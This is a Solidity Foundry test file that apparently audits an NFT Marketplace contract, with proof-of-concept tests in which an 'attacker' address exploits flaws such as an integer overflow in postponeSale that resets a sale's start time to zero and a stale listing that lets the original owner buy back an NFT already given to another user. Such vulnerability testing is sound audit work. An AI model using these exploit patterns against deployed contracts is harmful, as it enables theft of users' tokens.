// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";

import "../src/Marketplace.sol";

import "../src/Mocks/NftMock.sol";
import "../src/Mocks/PaymentTokenMock.sol";
import "../src/mocks/RewardTokenMock.sol";

import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";

contract MarketplaceTest is Test, ERC721Holder {
    Marketplace private marketplace;

    NftMock private nft;
    PaymentTokenMock private paymentToken;
    RewardTokenMock private rewardToken;

    Marketplace.ItemSale private defaultSale =
        Marketplace.ItemSale(address(this), 100, block.timestamp + 1000);

    uint256 private defaultBalance = type(uint96).max;
    uint256 private defaultTokenId = 0;

    address payable private attacker = payable(address(1));
    address payable private anotherUser = payable(address(2));

    function setUp() public {
        nft = new NftMock();
        nft.safeMint(address(this));

        paymentToken = new PaymentTokenMock();
        paymentToken.mint(address(this), defaultBalance);

        rewardToken = new RewardTokenMock();
        rewardToken.mint(address(this), defaultBalance);

        marketplace = new Marketplace(
            address(nft),
            address(paymentToken),
            address(rewardToken)
        );

        nft.setApprovalForAll(address(marketplace), true);

        // Config attacker
        vm.deal(attacker, 1 ether);
        paymentToken.mint(attacker, defaultBalance);

        vm.startPrank(attacker);
        nft.setApprovalForAll(address(marketplace), true);
        paymentToken.approve(address(marketplace), defaultBalance);

        vm.stopPrank();

        // Config another user

        vm.deal(anotherUser, 1 ether);
        paymentToken.mint(anotherUser, defaultBalance);

        vm.startPrank(anotherUser);
        paymentToken.approve(address(marketplace), defaultBalance);
        nft.setApprovalForAll(address(marketplace), true);

        vm.stopPrank();
    }

    // It is possible to put the token to sale even if the token is already on sale
    function test_tokenAlreadyInSale() external {
        uint256 newPrice = 123;

        marketplace.setForSale(
            defaultTokenId,
            defaultSale.price,
            defaultSale.startTime
        );

        marketplace.setForSale(defaultTokenId, newPrice, defaultSale.startTime);

        Marketplace.ItemSale memory item = getAndUnpackItemStruct(
            defaultTokenId
        );

        assertEq(item.price, newPrice);
    }

    function test_zeroPriceIsPossible() external {
        marketplace.setForSale(
            defaultTokenId,
            defaultSale.price,
            defaultSale.startTime
        );

        marketplace.setForSale(defaultTokenId, 0, defaultSale.startTime);
        vm.warp(defaultSale.startTime + 1);

        vm.expectRevert(Marketplace.InvalidSale.selector);
        vm.prank(attacker);
        marketplace.buy(0);
    }

    function test_ifTokenPriceLt1000RewardIs0() external {
        marketplace.setForSale(defaultTokenId, 1, defaultSale.startTime);
        vm.warp(defaultSale.startTime + 1);

        uint256 rewardBalanceBefore = rewardToken.balanceOf(attacker);
        vm.prank(attacker);
        marketplace.buy(0);
        uint256 rewardBalanceAfter = rewardToken.balanceOf(attacker);

        assertEq(rewardBalanceBefore, rewardBalanceAfter);
    }

    function test_postponeNonExistnigSale() external {
        uint256 newTimeStamp = 1000;
        marketplace.postponeSale(defaultTokenId, newTimeStamp);

        Marketplace.ItemSale memory item = getAndUnpackItemStruct(
            defaultTokenId
        );

        assertEq(item.startTime, newTimeStamp);
    }

    function test_abuseStartTime() external {
        // Simulate timestamp
        uint256 simulateNormalTimestamp = 1678722123;
        vm.warp(simulateNormalTimestamp);

        // Create new token for test case with id === 1
        nft.safeMint(attacker);

        // Start impersonate
        vm.startPrank(attacker);

        marketplace.setForSale(
            1,
            defaultSale.price,
            simulateNormalTimestamp + 1
        );

        Marketplace.ItemSale memory item = getAndUnpackItemStruct(1);
        console.log("Old start time: ", item.startTime);

        // Calc value to overflow
        uint256 postponeTime = type(uint256).max - item.startTime + 1;

        marketplace.postponeSale(1, postponeTime);

        Marketplace.ItemSale memory abusedItem = getAndUnpackItemStruct(1);

        console.log("Abused start time: ", abusedItem.startTime);

        assertEq(abusedItem.startTime, 0);
    }

    function test_unableToWithdraw1Reward() external {
        marketplace.setForSale(
            defaultTokenId,
            defaultSale.price,
            defaultSale.startTime
        );
        vm.warp(defaultSale.startTime + 1);

        vm.prank(anotherUser);
        marketplace.buy(defaultTokenId);

        vm.expectRevert(stdError.indexOOBError);
        marketplace.claim(address(this));
    }

    function test_fakeSale() external {
        // 1. The owner puts the token up for sale
        marketplace.setForSale(
            defaultTokenId,
            defaultSale.price,
            defaultSale.startTime
        );

        // Owner transfers token to anotherUser
        nft.safeTransferFrom(address(this), anotherUser, defaultTokenId);

        // User glad for his new NFT...

        // Sale starting
        vm.warp(defaultSale.startTime + 1);

        // Attacker (owner) from another address bought the token and receive it back
        vm.prank(attacker);
        marketplace.buy(defaultTokenId);

        address nftOwner = nft.ownerOf(defaultTokenId);
        assertEq(nftOwner, attacker);
    }

    function getAndUnpackItemStruct(
        uint256 tokenId
    ) internal view returns (Marketplace.ItemSale memory item) {
        (item.seller, item.price, item.startTime) = marketplace.items(tokenId);
    }
}
